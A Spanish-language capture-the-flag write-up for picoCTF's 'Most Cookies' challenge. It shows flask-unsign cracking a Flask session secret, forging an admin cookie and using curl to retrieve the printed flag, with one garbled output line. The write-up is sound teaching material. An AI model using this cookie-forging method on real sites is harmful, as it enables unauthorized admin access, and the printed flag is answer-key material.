## Objetivo
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/cae5577e6b8f86e17d7884723204f61e/server.py) [http://mercury.picoctf.net:6259/](http://mercury.picoctf.net:6259/)

## Solución

Hacemos un archivo con todas las palabras que nos da el archivo server.py
```bash
──(kali㉿kali)-[~/picoCTFretos]
└─$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.ZvyvUw.jGpw71pRzwBb3o03RcC0sE5571c" --wordlist galletas.txt
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'gingersnap'

┌──(kali㉿kali)-[~/picoCTFretos]
└─$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'gingersnap'
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZvyzOA.CDUcTdLUWP3ZDiVNJEj6nye-krM

──(kali㉿kali)-[~/picoCTFretos]
└─$ curl -s http://mercury.picoctf.net:6259/display -H 'Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZvyzOA.CDUcTdLUWP3ZDiVNJEj6nye-krM'
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Most Cookies</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Reset</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Most Cookies</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{pwn_4ll_th3_cook1E5_5f016958}</code></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF</p>
        </footer>

    </div>
</body>

</html>                                
```
## Notas adicionales
**PipX**-  es una **herramienta para instalar software escrito en Python por medio de espacios separados**. Está diseñada para ejecutar programas sin tener que forzar a cambiar la dependencia de otros programas.
## Referencias
[Flask](https://es.wikipedia.org/wiki/Flask)